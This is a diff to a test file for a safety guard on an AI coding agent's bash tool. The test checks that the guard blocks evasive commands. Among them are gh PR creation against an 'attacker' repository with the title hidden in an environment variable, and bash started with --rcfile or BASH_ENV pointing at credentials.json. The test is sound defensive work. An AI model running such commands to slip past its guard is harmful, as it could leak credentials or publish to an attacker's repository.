@@ -15,6 +15,8 @@ test("Pi adapter blocks proven GH permission denials through its registered tool
   const originalConfigHome = process.env.SAFETY_CORE_CONFIG_HOME;
   const runnerName = "SAFETY_CORE_TEST_RUNNER";
   const originalRunner = process.env[runnerName];
+  const titleName = "SAFETY_CORE_TEST_TITLE";
+  const originalTitle = process.env[titleName];
   try {
     mkdirSync(join(wasmDir, "node_modules"));
     copyFileSync(existsSync(join(process.cwd(), "tree-sitter-bash.wasm")) ? join(process.cwd(), "tree-sitter-bash.wasm") : join(process.cwd(), "node_modules", "tree-sitter-bash", "tree-sitter-bash.wasm"), join(wasmDir, "tree-sitter-bash.wasm"));
@@ -24,6 +26,7 @@ test("Pi adapter blocks proven GH permission denials through its registered tool
     writeFileSync(join(configHome, "safety-core", "profiles.json"), JSON.stringify({ ghApiReadOnly: true, ghPrCreate: { enabled: true, allowedRepositories: [], allowedOrganizations: [] } }));
     process.env.SAFETY_CORE_CONFIG_HOME = configHome;
     process.env[runnerName] = "gh";
+    process.env[titleName] = "x";
 
     const handlers = new Map<string, Function>();
     const pi = { on: (name: string, handler: Function) => handlers.set(name, handler), registerCommand() {}, registerTool() {} };
@@ -38,6 +41,9 @@ test("Pi adapter blocks proven GH permission denials through its registered tool
       "builtin command gh api user -X POST",
       "gh -X POST api user",
       "gh pr --title x create --body y --repo github.com/attacker/widgets",
+      `gh pr -t "$${titleName}" create -b y -Rgithub.com/attacker/widgets`,
+      "bash --rcfile credentials.json -ic true",
+      "BASH_ENV=credentials.json bash -c true",
     ]) {
       const blocked = await handlers.get("tool_call")!({ toolName: "bash", toolCallId: command, input: { command } }, { ui: { notify() {} } });
       expect(blocked, command).toMatchObject({ block: true });
@@ -49,9 +55,16 @@ test("Pi adapter blocks proven GH permission denials through its registered tool
     );
     expect(inheritedResult).toMatchObject({ block: true });
     expect(prompts).toBe(1);
+    const startupResult = await handlers.get("tool_call")!(
+      { toolName: "bash", toolCallId: "startup-test", input: { command: "bash --rcfile setup.sh -ic true" } },
+      { hasUI: true, ui: { confirm: async () => { prompts++; return false; }, notify() {} } },
+    );
+    expect(startupResult).toMatchObject({ block: true });
+    expect(prompts).toBe(2);
   } finally {
     if (originalConfigHome === undefined) delete process.env.SAFETY_CORE_CONFIG_HOME; else process.env.SAFETY_CORE_CONFIG_HOME = originalConfigHome;
     if (originalRunner === undefined) delete process.env[runnerName]; else process.env[runnerName] = originalRunner;
+    if (originalTitle === undefined) delete process.env[titleName]; else process.env[titleName] = originalTitle;
     rmSync(wasmDir, { force: true, recursive: true });
     rmSync(configHome, { force: true, recursive: true });
   }
